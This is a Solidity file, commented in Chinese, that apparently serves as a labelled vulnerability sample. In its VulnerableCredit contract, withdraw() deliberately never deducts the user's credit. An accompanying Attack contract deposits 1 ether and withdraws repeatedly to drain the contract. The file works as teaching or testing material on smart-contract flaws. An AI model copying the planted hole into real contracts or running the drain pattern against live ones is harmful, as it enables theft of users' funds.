pragma solidity >=0.8.0;

// SPDX-License-Identifier: UNLICENSED
// 此合約存在 Erroneous Credit Transfer 漏洞，信用轉移操作有誤，未扣除使用者餘額，造成可以重複提領資金

contract VulnerableCredit {
    // 儲存每個使用者的餘額 // 漏洞重點：使用者餘額計算失誤
    mapping(address => uint256) public credits;
    
    // 接收存款並累計信用
    function deposit() external payable {
        require(msg.value > 0, "msg.value must be > 0");
        credits[msg.sender] += msg.value;
    }

    // 允許使用者提領資金
    // 漏洞：未從 credits 中扣除已提領的金額，造成可以重複提款
    function withdraw(uint256 amount) external {
        require(credits[msg.sender] >= amount, "Insufficient credit");
        // 漏洞重點：未更新 credits[msg.sender]，使用者可以重複提款
        (bool sent, ) = msg.sender.call{value: amount}('');
        require(sent, "Transfer failed");
        // BUG：缺少 credits[msg.sender] -= amount; 這一行
    }

    // fallback 與 receive 用於接收 Ether
    fallback() external payable {}
    receive() external payable {}
}

// 攻擊合約：利用漏洞重複提款，最小可行攻擊範例
contract Attack {
    VulnerableCredit public vulnerable;

    // 在部署攻擊合約時傳入 VulnerableCredit 合約地址
    // 修改點：將地址轉換成 payable 型態以符合合約類型轉換要求
    constructor(address _vulnerableAddress) {
        vulnerable = VulnerableCredit(payable(_vulnerableAddress));
    }

    // 攻擊流程說明：
    // 1. 攻擊者先透過 deposit 存入一定數量的 ether，獲得對應信用
    // 2. 然後反覆呼叫 withdraw，因為信用扣除失敗，可多次提領超過原始信用
    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 Ether to attack");
        // 存款 1 Ether，建立信用
        vulnerable.deposit{value: 1 ether}();
        
        // 多次提領 1 Ether，每次因為未扣除信用而成功
        // 攻擊者可以多次呼叫 withdraw() 直到合約內 Ether 耗盡
        vulnerable.withdraw(1 ether);
        vulnerable.withdraw(1 ether);
        vulnerable.withdraw(1 ether);
        // 如有需要，可重複呼叫更多次以達到完全掠奪效果
    }

    // 接收 Ether
    receive() external payable {}
}